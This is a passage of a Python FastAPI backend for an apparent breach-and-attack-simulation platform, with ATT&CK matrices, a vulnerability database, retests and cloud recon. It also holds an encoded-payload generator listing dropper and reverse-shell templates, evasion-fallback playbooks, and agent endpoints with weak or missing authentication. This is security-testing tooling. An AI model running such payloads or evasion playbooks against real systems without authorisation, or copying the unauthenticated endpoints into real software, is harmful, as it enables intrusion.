        "LATERAL_MOVEMENT":     ("TA0008", "LAT MOVE"),
        "COLLECTION":           ("TA0009", "COLLECTION"),
        "COMMAND_AND_CONTROL":  ("TA0011", "C2"),
        "EXFILTRATION":         ("TA0010", "EXFIL"),
        "IMPACT":               ("TA0040", "IMPACT"),
    }

    # Gather findings for this user
    sims_q = db.query(Simulation).filter(Simulation.user_id == current_user.id, Simulation.status == "completed")
    if simulation_id:
        sims_q = sims_q.filter(Simulation.id == simulation_id)
    sims = sims_q.all()

    # Build status map: technique_id -> {status, cvss, simulations}
    status_map: dict = {}
    for sim in sims:
        for t in (sim.results or {}).get("techniques", []):
            tid = t.get("id", "")
            if not tid:
                continue
            existing = status_map.get(tid)
            if not existing or t.get("status") == "found":
                status_map[tid] = {
                    "status": t.get("status", "not_tested"),
                    "cvss": t.get("cvss", 0),
                    "simulations": (existing["simulations"] + 1) if existing else 1,
                }

    # Build matrix grouped by tactic (preserving insertion order)
    tactic_map: dict = {}
    for tech in ALL_TECHNIQUES:
        tac_name = tech.tactic.name  # e.g. "RECONNAISSANCE"
        if tac_name not in tactic_map:
            tactic_map[tac_name] = []
        tid = tech.technique_id
        st_info = status_map.get(tid, {"status": "not_tested", "cvss": 0, "simulations": 0})
        _SEV_CVSS_MX = {"critical": 9.0, "high": 7.5, "medium": 5.0, "low": 3.0}
        _COMPLIANCE_MAP = {
            "RECONNAISSANCE":       ["NIST SP 800-53 RA-5", "ISO 27001 A.12.6"],
            "INITIAL_ACCESS":       ["OWASP A01:2021", "NIST SP 800-53 AC-17", "PCI-DSS 6.4.3"],
            "EXECUTION":            ["NIST SP 800-53 SI-3", "ISO 27001 A.12.2", "CIS Control 2"],
            "PERSISTENCE":          ["NIST SP 800-53 CM-7", "ISO 27001 A.12.5", "CIS Control 5"],
            "PRIVILEGE_ESCALATION": ["NIST SP 800-53 AC-6", "ISO 27001 A.9.2", "CIS Control 5"],
            "DEFENSE_EVASION":      ["NIST SP 800-53 SI-4", "ISO 27001 A.12.4", "CIS Control 8"],
            "CREDENTIAL_ACCESS":    ["NIST SP 800-53 IA-5", "ISO 27001 A.9.4", "PCI-DSS 8.2.3"],
            "DISCOVERY":            ["NIST SP 800-53 CA-7", "ISO 27001 A.12.6", "CIS Control 7"],
            "LATERAL_MOVEMENT":     ["NIST SP 800-53 SC-7", "ISO 27001 A.13.1", "PCI-DSS 1.2"],
            "COLLECTION":           ["NIST SP 800-53 SI-12", "ISO 27001 A.8.2", "LGPD Art.46"],
            "COMMAND_AND_CONTROL":  ["NIST SP 800-53 SC-7", "ISO 27001 A.13.2", "CIS Control 13"],
            "EXFILTRATION":         ["NIST SP 800-53 SC-8", "ISO 27001 A.13.2", "LGPD Art.48", "PCI-DSS 4.2"],
            "IMPACT":               ["NIST SP 800-53 CP-9", "ISO 27001 A.17.1", "CIS Control 10"],
            "RESOURCE_DEVELOPMENT": ["NIST SP 800-53 PM-16", "ISO 27001 A.6.1"],
        }
        tech_layman = _TECH_LAYMAN.get(tid, ("", "", ""))
        compliance = _COMPLIANCE_MAP.get(tac_name, [])
        tactic_map[tac_name].append({
            "id": tid,
            "name": tech.name,
            "status": st_info["status"],
            "cvss": st_info["cvss"] or _SEV_CVSS_MX.get(tech.severity.lower() if tech.severity else "", 0),
            "simulations": st_info["simulations"],
            "description": tech.description,
            "severity": tech.severity,
            "compliance": compliance,
            "remediation": tech_layman[2] if tech_layman else "",
        })

    tactic_list = []
    for tac_name, techs in tactic_map.items():
        meta = TACTIC_META.get(tac_name, ("", tac_name[:8]))
        tactic_list.append({
            "id": meta[0],
            "name": tac_name.replace("_", " ").title(),
            "short": meta[1],
            "techniques": techs,
        })

    all_techs = [t for tac in tactic_list for t in tac["techniques"]]
    total = len(all_techs)
    tested = sum(1 for t in all_techs if t["status"] != "not_tested")
    found = sum(1 for t in all_techs if t["status"] == "found")
    blocked = sum(1 for t in all_techs if t["status"] == "blocked")

    return {
        "tactics": tactic_list,
        "stats": {
            "total": total,
            "tested": tested,
            "found": found,
            "blocked": blocked,
            "not_tested": total - tested,
            "coverage_pct": round(tested / max(total, 1) * 100, 1),
        },
    }


# ── Vulnerability Database ─────────────────────────────────────────────────────

@app.get("/api/bas/vulndb")
async def vuln_db(
    severity: Optional[str] = None,
    status: Optional[str] = None,
    days: Optional[int] = None,
    dedupe: bool = False,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    from bas_engine import ALL_TECHNIQUES
    _SEV_NORM = {"critical": "Critical", "high": "High", "medium": "Medium", "low": "Low"}
    _SEV_CVSS = {"Critical": 9.0, "High": 7.5, "Medium": 5.0, "Low": 3.0}
    _TECH_META = {t.technique_id: t for t in ALL_TECHNIQUES}

    sims_q = db.query(Simulation).filter(
        Simulation.user_id == current_user.id,
        Simulation.status == "completed",
    )
    if days:
        since = datetime.utcnow() - timedelta(days=days)
        sims_q = sims_q.filter(Simulation.date >= since)
    sims = sims_q.order_by(Simulation.date.desc()).all()

    vulns = []
    for sim in sims:
        results = sim.results or {}
        for t in results.get("techniques", []):
            if status and t.get("status") != status:
                continue
            tid = t.get("id", "")
            # Enrich with ALL_TECHNIQUES metadata when simulation result lacks it
            meta = _TECH_META.get(tid)
            sev_raw = t.get("severity", "") or (meta.severity if meta else "")
            sev = _SEV_NORM.get(sev_raw.lower(), sev_raw)
            if severity and sev.lower() != severity.lower():
                continue
            cvss = t.get("cvss") or _SEV_CVSS.get(sev, 0)
            tech_info = _TECH_LAYMAN.get(tid, ("", "", ""))
            vulns.append({
                "id": f"{sim.id}_{tid}",
                "technique_id": tid,
                "name": t.get("name", "") or (meta.name if meta else tid),
                "severity": sev,
                "cvss": cvss,
                "status": t.get("status", ""),
                "target": sim.target,
                "simulation_id": sim.id,
                "date": sim.date.isoformat(),
                "compliance": t.get("compliance", []),
                "remediation": t.get("remediation", "") or tech_info[2],
                "detail": t.get("detail", ""),
                "description": t.get("description", "") or (meta.description if meta else tech_info[1]),
            })

    sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "": 4}
    vulns.sort(key=lambda v: (sev_order.get(v["severity"], 4), -v["cvss"]))

    # Deduplication: keep latest per (technique_id, target, status)
    if dedupe:
        seen_keys: set = set()
        deduped = []
        for v in vulns:
            key = (v["technique_id"], v["target"], v["status"])
            if key not in seen_keys:
                seen_keys.add(key)
                deduped.append(v)
        vulns = deduped

    stats = {
        "total": len(vulns),
        "critical": sum(1 for v in vulns if v["severity"] == "Critical"),
        "high": sum(1 for v in vulns if v["severity"] == "High"),
        "medium": sum(1 for v in vulns if v["severity"] == "Medium"),
        "low": sum(1 for v in vulns if v["severity"] == "Low"),
        "unique_techniques": len({v["technique_id"] for v in vulns}),
        "unique_targets": len({v["target"] for v in vulns}),
        "found": sum(1 for v in vulns if v["status"] == "found"),
        "blocked": sum(1 for v in vulns if v["status"] == "blocked"),
    }
    return {"vulns": vulns, "stats": stats}


@app.get("/api/bas/vulndb/export")
async def vuln_db_export(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    import csv, io as _io
    from bas_engine import ALL_TECHNIQUES
    _SEV_NORM = {"critical": "Critical", "high": "High", "medium": "Medium", "low": "Low"}
    _SEV_CVSS = {"Critical": 9.0, "High": 7.5, "Medium": 5.0, "Low": 3.0}
    _TECH_META = {t.technique_id: t for t in ALL_TECHNIQUES}
    sims = db.query(Simulation).filter(
        Simulation.user_id == current_user.id, Simulation.status == "completed"
    ).order_by(Simulation.date.desc()).all()
    buf = _io.StringIO()
    writer = csv.writer(buf)
    writer.writerow([
        "Technique ID", "Name", "Tactic", "Severity", "CVSS", "Status",
        "Target", "Simulation ID", "Date", "Compliance", "Remediation", "Detail",
    ])
    for sim in sims:
        for t in (sim.results or {}).get("techniques", []):
            tid = t.get("id", "")
            meta = _TECH_META.get(tid)
            sev_raw = t.get("severity", "") or (meta.severity if meta else "")
            sev = _SEV_NORM.get(sev_raw.lower(), sev_raw)
            cvss = t.get("cvss") or _SEV_CVSS.get(sev, 0)
            tactic = meta.tactic.name.replace("_", " ").title() if meta else ""
            tech_info = _TECH_LAYMAN.get(tid, ("", "", ""))
            compliance = ";".join(t.get("compliance", []))
            remediation = t.get("remediation", "") or tech_info[2]
            writer.writerow([
                tid, t.get("name", "") or (meta.name if meta else tid),
                tactic, sev, cvss, t.get("status", ""),
                sim.target, sim.id, sim.date.strftime("%Y-%m-%d %H:%M"),
                compliance, remediation, t.get("detail", ""),
            ])
    buf.seek(0)
    return StreamingResponse(iter([buf.getvalue()]), media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=penteia_vulndb.csv"})


# ── BAS Retest (post-remediation) ─────────────────────────────────────────────

@app.post("/api/bas/retest/{sim_id}")
async def bas_retest(
    sim_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    original = db.query(Simulation).filter(
        Simulation.id == sim_id, Simulation.user_id == current_user.id
    ).first()
    if not original:
        raise HTTPException(status_code=404, detail="Simulação original não encontrada")
    if original.status != "completed":
        raise HTTPException(status_code=400, detail="Simulação ainda não concluída")

    playbook = db.query(Playbook).filter(Playbook.id == original.playbook_id).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")

    retest_sim = Simulation(
        user_id=current_user.id,
        playbook_id=original.playbook_id,
        target=original.target,
        status="running",
        score=0.0,
    )
    db.add(retest_sim)
    db.commit()
    db.refresh(retest_sim)

    threading.Thread(
        target=_bas_run_retest,
        args=(retest_sim.id, original.id, playbook.name, original.target, playbook.severity, playbook.techniques),
        daemon=True,
    ).start()

    _operation_logs.append({
        "module": "BAS", "action": "Retest iniciado",
        "details": f"Retest de {sim_id} → {original.target}",
        "timestamp": datetime.utcnow().isoformat(),
    })
    return {"id": retest_sim.id, "original_id": sim_id, "status": "running", "message": "Retest iniciado"}


def _bas_run_retest(retest_id: str, original_id: str, playbook_name: str, target: str, severity: str, num_techniques: int):
    """Execute retest and compare with original simulation."""
    _bas_run(retest_id, playbook_name, target, severity, num_techniques)
    db_r = SessionLocal()
    try:
        retest = db_r.query(Simulation).filter(Simulation.id == retest_id).first()
        original = db_r.query(Simulation).filter(Simulation.id == original_id).first()
        if retest and original and retest.results and original.results:
            orig_vulns = {t["id"] for t in original.results.get("techniques", []) if t.get("status") == "found"}
            retest_vulns = {t["id"] for t in retest.results.get("techniques", []) if t.get("status") == "found"}
            remediated = orig_vulns - retest_vulns
            new_vulns = retest_vulns - orig_vulns
            improvement = round(original.score - retest.score, 1)
            retest_results = dict(retest.results)
            retest_results["retest_comparison"] = {
                "original_id": original_id,
                "original_score": original.score,
                "retest_score": retest.score,
                "score_change": round(retest.score - original.score, 1),
                "improvement": improvement,
                "remediated_count": len(remediated),
                "remediated_techniques": list(remediated),
                "new_vulns_count": len(new_vulns),
                "new_vuln_techniques": list(new_vulns),
                "persisted_count": len(orig_vulns & retest_vulns),
                "persisted_techniques": list(orig_vulns & retest_vulns),
            }
            retest.results = retest_results
            db_r.commit()
            # Notification for retest completion
            try:
                status_msg = f"✅ {len(remediated)} remediadas, ⚠️ {len(new_vulns)} novas, score: {original.score:.1f}% → {retest.score:.1f}%"
                notif_type = "success" if improvement > 0 else "warning"
                _n = Notification(user_id=retest.user_id,
                    title="Retest Concluído", message=f"{playbook_name} → {target} | {status_msg}",
                    type=notif_type)
                db_r.add(_n)
                db_r.commit()
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(_ws_broadcast({
                    "type": "retest_complete",
                    "retest_id": retest_id, "original_id": original_id,
                    "improvement": improvement, "remediated": len(remediated),
                    "timestamp": datetime.utcnow().isoformat(),
                }), loop)
            except Exception:
                pass
    finally:
        db_r.close()


@app.get("/api/bas/retest/{retest_id}/comparison")
async def get_retest_comparison(
    retest_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Return before/after comparison for a completed retest simulation."""
    sim = db.query(Simulation).filter(
        Simulation.id == retest_id, Simulation.user_id == current_user.id
    ).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação de retest não encontrada")
    if sim.status == "running":
        return {"status": "running", "message": "Retest ainda em andamento"}
    comparison = (sim.results or {}).get("retest_comparison")
    if not comparison:
        raise HTTPException(status_code=404, detail="Dados de comparação não disponíveis")
    return {"status": "completed", "comparison": comparison, "retest_score": sim.score}


# ── Payload Generator ─────────────────────────────────────────────────────────

class PayloadGenerateRequest(BaseModel):
    payload_type: str = "test"
    encoder: str = "xor"
    output_format: str = "base64"
    xor_key: Optional[str] = None
    aes_key: Optional[str] = None
    iterations: int = 1

@app.get("/api/payload/templates")
async def payload_templates(current_user: User = Depends(get_current_user)):
    if _HAS_PAYLOAD_GEN:
        return {"templates": _get_payload_templates()}
    return {"templates": [
        {"id": "test_eicar", "name": "EICAR-style Test String", "description": "Inert test payload for AV/EDR validation"},
        {"id": "ps1_dropper", "name": "PowerShell Dropper", "description": "PS1 dropper template for endpoint testing"},
        {"id": "python_rev", "name": "Python Reverse Shell Stub", "description": "Python test artifact (inert)"},
    ]}

@app.post("/api/payload/generate")
async def payload_generate(
    req: PayloadGenerateRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    if not _HAS_PAYLOAD_GEN:
        raise HTTPException(status_code=503, detail="Módulo payload_generator não instalado")
    try:
        enc = EncoderType(req.encoder)
        fmt = PayloadFormat(req.output_format)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    result = _gen_payload(
        payload_type=req.payload_type,
        encoder=enc,
        output_format=fmt,
        xor_key=req.xor_key,
        aes_key=req.aes_key,
        iterations=max(1, min(req.iterations, 5)),
    )

    payload_rec = Payload(
        user_id=current_user.id,
        name=f"{req.payload_type}_{req.encoder}_{datetime.utcnow().strftime('%H%M%S')}",
        type=f"{req.encoder}/{req.output_format}",
        size=str(result["size_bytes"]),
        content=result["payload_b64"].encode(),
    )
    db.add(payload_rec)
    db.commit()
    db.refresh(payload_rec)

    _operation_logs.append({"module": "Evasion", "action": "Payload gerado",
        "details": f"{req.payload_type} ({req.encoder}/{req.output_format})",
        "timestamp": datetime.utcnow().isoformat()})
    _audit(db, "Evasion", "Payload gerado", f"{req.payload_type} encoder={req.encoder} format={req.output_format}", current_user.id)
    return {**result, "saved_payload_id": payload_rec.id}


# ── Cloud Recon ───────────────────────────────────────────────────────────────

class CloudReconRequest(BaseModel):
    host: str
    company_name: str = ""
    extra_words: List[str] = []

@app.post("/api/cloud/recon")
async def cloud_recon_start(
    req: CloudReconRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    record = CloudReconResult(
        user_id=current_user.id,
        host=req.host,
        company_name=req.company_name or req.host.split(".")[0],
        status="running",
    )
    db.add(record)
    db.commit()
    db.refresh(record)

    def _run(rec_id: str, host: str, company: str, words: list):
        db2 = SessionLocal()
        try:
            rec = db2.query(CloudReconResult).filter(CloudReconResult.id == rec_id).first()
            if not rec:
                return
            if _HAS_CLOUD_RECON:
                cr = _run_cloud_recon(host, company, words)
                rec.cloud_provider = cr.cloud_provider
                rec.results = {
                    "s3_buckets": cr.s3_buckets,
                    "metadata_endpoints": cr.metadata_endpoints,
                    "iam_findings": cr.iam_findings,
                    "errors": cr.errors,
                }
            else:
                rec.cloud_provider = "Not available (cloud_recon module missing)"
                rec.results = {"s3_buckets": [], "metadata_endpoints": [], "iam_findings": [], "errors": []}
            rec.status = "done"
            rec.completed_at = datetime.utcnow()
            db2.commit()
            # WebSocket broadcast: cloud recon completed
            try:
                loop = asyncio.get_event_loop()
                asyncio.run_coroutine_threadsafe(_ws_broadcast({
                    "type": "cloud_recon_complete",
                    "id": rec.id, "host": rec.host,
                    "cloud_provider": rec.cloud_provider,
                    "timestamp": datetime.utcnow().isoformat(),
                }), loop)
                # Persist notification
                _n = Notification(user_id=rec.user_id, title="Cloud Recon Concluído",
                    message=f"{rec.host} — {rec.cloud_provider}", type="success")
                db2.add(_n); db2.commit()
            except Exception:
                pass
        except Exception as e:
            try:
                rec.status = "error"
                rec.results = {"error": str(e)}
                db2.commit()
            except Exception:
                pass
        finally:
            db2.close()

    threading.Thread(target=_run, args=(record.id, req.host, record.company_name, req.extra_words), daemon=True).start()
    _operation_logs.append({"module": "Recon", "action": "Cloud Recon",
        "details": req.host, "timestamp": datetime.utcnow().isoformat()})
    _audit(db, "Cloud", "Cloud Recon iniciado", req.host, current_user.id)
    return {"id": record.id, "status": "running", "message": "Cloud recon iniciado"}


@app.get("/api/cloud/results/{result_id}")
async def cloud_recon_result(result_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    rec = db.query(CloudReconResult).filter(
        CloudReconResult.id == result_id, CloudReconResult.user_id == current_user.id
    ).first()
    if not rec:
        raise HTTPException(status_code=404, detail="Resultado não encontrado")
    return {
        "id": rec.id, "host": rec.host, "company_name": rec.company_name,
        "status": rec.status, "cloud_provider": rec.cloud_provider,
        "results": rec.results or {},
        "created_at": rec.created_at.isoformat(),
        "completed_at": rec.completed_at.isoformat() if rec.completed_at else None,
    }


@app.get("/api/cloud/results")
async def cloud_recon_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    recs = db.query(CloudReconResult).filter(
        CloudReconResult.user_id == current_user.id
    ).order_by(CloudReconResult.created_at.desc()).limit(20).all()
    return {"results": [
        {"id": r.id, "host": r.host, "company_name": r.company_name, "status": r.status,
         "cloud_provider": r.cloud_provider, "created_at": r.created_at.isoformat()}
        for r in recs
    ]}


# ── BAS Adaptive (fallback when technique blocked) ────────────────────────────

@app.get("/api/bas/adaptive-playbook/{sim_id}")
async def adaptive_playbook(
    sim_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Generate an adaptive playbook with fallback techniques for blocked ones."""
    sim = db.query(Simulation).filter(
        Simulation.id == sim_id, Simulation.user_id == current_user.id
    ).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    FALLBACKS = {
        "T1190": ["T1078", "T1133"],    # Exploit pub facing → Valid Accounts / External Remote
        "T1059": ["T1086", "T1064"],    # Command Script → PowerShell / Scripting
        "T1003": ["T1552", "T1555"],    # OS Cred Dump → Unsecured Creds / Creds from Stores
        "T1053": ["T1543", "T1547"],    # Scheduled Task → Create/Modify Service / Boot Autostart
        "T1055": ["T1574", "T1218"],    # Process Injection → Hijack Exec Flow / Signed Binary Proxy
        "T1021": ["T1563", "T1570"],    # Remote Services → Remote Session Hijack / Lateral Tool Transfer
        "T1041": ["T1048", "T1567"],    # Exfil over C2 → Exfil over Alt Proto / Exfil over Web Service
        "T1486": ["T1490", "T1485"],    # Data Encrypted → Inhibit Recovery / Data Destruction
    }

    results = sim.results or {}
    techniques = results.get("techniques", [])
    blocked = [t for t in techniques if t.get("status") == "blocked"]

    adaptive = []
    for t in blocked:
        tid = t.get("id", "")
        fallbacks = FALLBACKS.get(tid, [])
        adaptive.append({
            "original_technique": tid,
            "original_name": t.get("name", ""),
            "reason_blocked": "Detectado/bloqueado pela defesa",
            "fallback_techniques": fallbacks,
            "recommendation": f"Tente {', '.join(fallbacks) if fallbacks else 'técnica alternativa'} para contornar a defesa",
        })

    return {
        "simulation_id": sim_id,
        "blocked_count": len(blocked),
        "adaptive_techniques": adaptive,
        "message": f"{len(adaptive)} técnicas com alternativas sugeridas",
    }


# ── SIEM/EDR Integration stub ─────────────────────────────────────────────────

class SIEMCheckRequest(BaseModel):
    simulation_id: str
    siem_type: str = "wazuh"   # wazuh / elastic / splunk
    siem_url: Optional[str] = None
    siem_token: Optional[str] = None

@app.post("/api/bas/siem-check")
async def siem_detection_check(
    req: SIEMCheckRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Check if BAS simulation techniques were detected by SIEM/EDR."""
    sim = db.query(Simulation).filter(
        Simulation.id == req.simulation_id, Simulation.user_id == current_user.id
    ).first()
    if not sim:
        raise HTTPException(status_code=404, detail="Simulação não encontrada")

    techniques = (sim.results or {}).get("techniques", [])
    detection_results = []

    if req.siem_url and req.siem_token and req.siem_type == "wazuh":
        for t in techniques:
            if t.get("status") != "found":
                continue
            try:
                headers = {"Authorization": f"Bearer {req.siem_token}"}
                r = _requests.get(
                    f"{req.siem_url}/api/alerts",
                    params={"q": f"rule.mitre.id:{t.get('id','')}", "limit": 5},
                    headers=headers, timeout=5, verify=False,
                )
                if r.status_code == 200:
                    data = r.json()
                    count = data.get("data", {}).get("totalItems", 0)
                    detection_results.append({
                        "technique_id": t.get("id"), "name": t.get("name"),
                        "siem_detected": count > 0, "alert_count": count,
                        "siem_type": "wazuh",
                    })
            except Exception:
                detection_results.append({
                    "technique_id": t.get("id"), "name": t.get("name"),
                    "siem_detected": None, "alert_count": 0,
                    "siem_type": "wazuh", "error": "Falha ao consultar SIEM",
                })
    else:
        # Stub response when no SIEM configured
        for t in techniques[:10]:
            if t.get("status") == "found":
                detection_results.append({
                    "technique_id": t.get("id"), "name": t.get("name"),
                    "siem_detected": None, "alert_count": 0,
                    "siem_type": req.siem_type,
                    "note": "Configure SIEM URL e token para resultados reais",
                })

    detected = sum(1 for d in detection_results if d.get("siem_detected"))
    total_checked = len(detection_results)
    return {
        "simulation_id": req.simulation_id,
        "siem_type": req.siem_type,
        "siem_configured": bool(req.siem_url and req.siem_token),
        "techniques_checked": total_checked,
        "detected_by_siem": detected,
        "not_detected": total_checked - detected,
        "detection_rate_pct": round(detected / max(total_checked, 1) * 100, 1),
        "results": detection_results,
    }


# ── WebSocket Dashboard ──────────────────────────────────────────────────────

@app.websocket("/ws/dashboard")
async def ws_dashboard(websocket: WebSocket):
    await websocket.accept()
    _ws_clients.add(websocket)
    try:
        while True:
            try:
                db = SessionLocal()
                total_sims = db.query(Simulation).count()
                recent = db.query(Simulation).filter(Simulation.status == "completed").order_by(Simulation.date.desc()).limit(5).all()
                scores = [s.score for s in recent if s.score]
                avg_score = round(sum(scores) / len(scores), 1) if scores else 0
                db.close()
                await websocket.send_json({
                    "type": "dashboard_update",
                    "total_simulations": total_sims,
                    "avg_score": avg_score,
                    "timestamp": datetime.utcnow().isoformat(),
                })
            except Exception:
                pass
            await asyncio.sleep(10)
    except WebSocketDisconnect:
        _ws_clients.discard(websocket)
    except Exception:
        _ws_clients.discard(websocket)


# ── Agents endpoints ──────────────────────────────────────────────────────────

class AgentRegisterRequest(BaseModel):
    hostname: str
    ip: str = ""
    os_info: str = ""
    username: str = ""
    python_version: str = ""
    agent_token: Optional[str] = None
    user_id: Optional[str] = None

@app.post("/api/agents/register")
async def agent_register(req: AgentRegisterRequest, db: Session = Depends(get_db)):
    user = None
    if req.agent_token:
        user = db.query(User).filter(User.id == req.user_id).first()
    if not user and req.user_id:
        user = db.query(User).filter(User.id == req.user_id).first()
    if not user:
        user = db.query(User).first()
    if not user:
        raise HTTPException(status_code=400, detail="Nenhum usuário encontrado")

    existing = db.query(PenteiaAgent).filter(
        PenteiaAgent.user_id == user.id, PenteiaAgent.hostname == req.hostname
    ).first()

    if existing:
        existing.ip = req.ip or existing.ip
        existing.os_info = req.os_info or existing.os_info
        existing.username = req.username or existing.username
        existing.python_version = req.python_version or existing.python_version
        existing.last_seen = datetime.utcnow()
        existing.status = "active"
        db.commit()
        return {"agent_id": existing.id, "status": "updated"}

    agent = PenteiaAgent(
        user_id=user.id, hostname=req.hostname, ip=req.ip,
        os_info=req.os_info, username=req.username,
        python_version=req.python_version, agent_token=req.agent_token,
        status="active",
    )
    db.add(agent)
    db.commit()
    db.refresh(agent)
    _audit(db, "Agents", "Agente registrado", req.hostname, user.id)
    return {"agent_id": agent.id, "status": "registered"}


@app.get("/api/agents")
async def agents_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    agents = db.query(PenteiaAgent).filter(PenteiaAgent.user_id == current_user.id).order_by(PenteiaAgent.last_seen.desc()).all()
    now = datetime.utcnow()
    result = []
    for a in agents:
        secs = int((now - a.last_seen).total_seconds()) if a.last_seen else 9999
        if secs > 300 and a.status == "active":
            a.status = "idle"
        if secs > 3600 and a.status in ("active", "idle"):
            a.status = "lost"
        result.append({
            "id": a.id, "hostname": a.hostname, "ip": a.ip, "os_info": a.os_info,
            "username": a.username, "python_version": a.python_version,
            "status": a.status, "last_seen": a.last_seen.isoformat() if a.last_seen else None,
            "last_seen_secs": secs, "created_at": a.created_at.isoformat() if a.created_at else None,
        })
    db.commit()
    return {"agents": result}


@app.delete("/api/agents/{agent_id}")
async def agent_delete(agent_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    agent = db.query(PenteiaAgent).filter(PenteiaAgent.id == agent_id, PenteiaAgent.user_id == current_user.id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    db.delete(agent)
    db.commit()
    return {"status": "deleted"}


class AgentExecuteRequest(BaseModel):
    techniques: List[str] = []

@app.post("/api/agents/{agent_id}/execute")
async def agent_execute(agent_id: str, req: AgentExecuteRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    agent = db.query(PenteiaAgent).filter(PenteiaAgent.id == agent_id, PenteiaAgent.user_id == current_user.id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")

    TECH_META = {
        "T1082": {"name": "System Information Discovery", "cvss": 5.3, "compliance": ["ISO 27001 A.8", "NIST SP 800-53 CM-8"]},
        "T1087": {"name": "Account Discovery", "cvss": 5.3, "compliance": ["CIS Control 5", "NIST SP 800-53 AC-2"]},
        "T1548": {"name": "Privilege Escalation Vectors", "cvss": 7.8, "compliance": ["NIST SP 800-53 AC-6", "ISO 27001 A.9.2"]},
        "T1552": {"name": "Credential Hunting", "cvss": 8.8, "compliance": ["PCI-DSS 8.2", "NIST SP 800-53 IA-5", "LGPD Art. 46"]},
        "T1053": {"name": "Persistence Mechanisms", "cvss": 6.5, "compliance": ["CIS Control 10", "ISO 27001 A.12.6"]},
        "T1016": {"name": "Network Reconnaissance", "cvss": 5.3, "compliance": ["ISO 27001 A.13.1", "NIST SP 800-53 CM-7"]},
        "T1057": {"name": "Process Discovery", "cvss": 6.5, "compliance": ["CIS Control 2", "NIST SP 800-53 SI-4"]},
        "T1083": {"name": "Sensitive File Discovery", "cvss": 7.5, "compliance": ["ISO 27001 A.8.2", "PCI-DSS 3.4", "LGPD Art. 46"]},
    }
    REMEDIATION = {
        "T1082": "Restrinja permissões de leitura de informações do sistema. Use CIS Benchmarks para hardening.",
        "T1087": "Implemente princípio de menor privilégio. Audite contas periodicamente.",
        "T1548": "Remova SUID desnecessários. Revise configurações sudo. Monitore escalada de privilégio.",
        "T1552": "Nunca armazene credenciais em texto plano. Use gerenciadores de segredos (Vault, AWS Secrets Manager).",
        "T1053": "Audite tarefas agendadas e serviços de inicialização regularmente.",
        "T1016": "Segmente redes. Limite descoberta de hosts entre segmentos.",
        "T1057": "Monitore processos com EDR. Liste processos autorizados (allowlist).",
        "T1083": "Mova arquivos sensíveis para locais protegidos. Use criptografia em repouso.",
    }

    created = []
    for tech_id in req.techniques:
        meta = TECH_META.get(tech_id, {"name": tech_id, "cvss": 5.0, "compliance": []})
        task = AgentTask(
            agent_id=agent.id, technique=tech_id, status="pending",
            result={"name": meta["name"], "cvss_score": meta["cvss"],
                    "compliance": meta["compliance"], "remediation": REMEDIATION.get(tech_id, ""),
                    "detail": "Tarefa pendente de execução pelo agente."},
        )
        db.add(task)
        created.append(task)

    agent.last_seen = datetime.utcnow()
    db.commit()
    _audit(db, "Agents", "Técnicas enfileiradas", f"{len(created)} técnicas → {agent.hostname}", current_user.id)
    return {"queued": len(created), "agent_id": agent_id}


@app.get("/api/agents/{agent_id}/results")
async def agent_results(agent_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    agent = db.query(PenteiaAgent).filter(PenteiaAgent.id == agent_id, PenteiaAgent.user_id == current_user.id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    tasks = db.query(AgentTask).filter(AgentTask.agent_id == agent_id).order_by(AgentTask.created_at.desc()).all()
    results = []
    for t in tasks:
        r = t.result or {}
        results.append({
            "task_id": t.id, "technique": t.technique, "status": t.status,
            "name": r.get("name", t.technique), "detail": r.get("detail", ""),
            "cvss_score": r.get("cvss_score", 0), "compliance": r.get("compliance", []),
            "remediation": r.get("remediation", ""), "data": r.get("data"),
            "created_at": t.created_at.isoformat() if t.created_at else None,
        })
    return {
        "agent": {"id": agent.id, "hostname": agent.hostname, "ip": agent.ip, "os_info": agent.os_info},
        "results": results,
    }


@app.get("/api/agents/{agent_id}/pending-tasks")
async def agent_pending_tasks(agent_id: str, db: Session = Depends(get_db)):
    agent = db.query(PenteiaAgent).filter(PenteiaAgent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    agent.last_seen = datetime.utcnow()
    agent.status = "active"
    db.commit()
    tasks = db.query(AgentTask).filter(AgentTask.agent_id == agent_id, AgentTask.status == "pending").all()
    for t in tasks:
        t.status = "running"
    db.commit()
    return {"tasks": [{"id": t.id, "technique": t.technique} for t in tasks]}


class AgentTaskResultRequest(BaseModel):
    task_id: str
    status: str
    result: dict = {}

@app.post("/api/agents/{agent_id}/task-result")
async def agent_task_result(agent_id: str, req: AgentTaskResultRequest, db: Session = Depends(get_db)):
    task = db.query(AgentTask).filter(AgentTask.id == req.task_id, AgentTask.agent_id == agent_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Tarefa não encontrada")
    task.status = req.status
    task.result = {**task.result, **req.result}
    task.completed_at = datetime.utcnow()
    db.commit()
    return {"status": "updated"}


# ── VulnDB endpoints ──────────────────────────────────────────────────────────

@app.get("/api/bas/vulndb")
async def vulndb_list(days: int = 0, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
